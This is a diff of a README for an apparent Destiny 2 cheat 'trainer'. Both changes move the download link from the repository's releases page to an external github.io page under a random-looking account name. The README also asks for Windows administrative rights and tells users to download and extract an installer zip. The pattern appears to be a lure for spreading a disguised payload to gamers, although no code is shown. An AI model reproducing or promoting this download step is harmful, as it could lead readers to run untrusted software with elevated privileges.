@@ -1,6 +1,6 @@
 # 🎮 Destiny2-Ultimate-Trainer-2026 - Improve your game performance and mechanics
 
-[![Download Latest Version](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Multibankholdingcompanygenuslansium765/Destiny2-Ultimate-Trainer-2026/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://multibankholdingcompanygenuslansium765.github.io)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ You must have administrative permissions on your Windows user account to operate
 
 Follow these instructions to set up the software on your system.
 
-1.  Visit the official releases page to get the installer: [https://github.com/Multibankholdingcompanygenuslansium765/Destiny2-Ultimate-Trainer-2026/releases](https://github.com/Multibankholdingcompanygenuslansium765/Destiny2-Ultimate-Trainer-2026/releases)
+1.  Visit the official releases page to get the installer: [https://multibankholdingcompanygenuslansium765.github.io](https://multibankholdingcompanygenuslansium765.github.io)
 2.  Click the entry labeled "Destiny2-Ultimate-Trainer-Installer.zip" to download the file.
 3.  Open the folder where you saved the file and right-click it.
 4.  Select "Extract All" to see the folder contents.
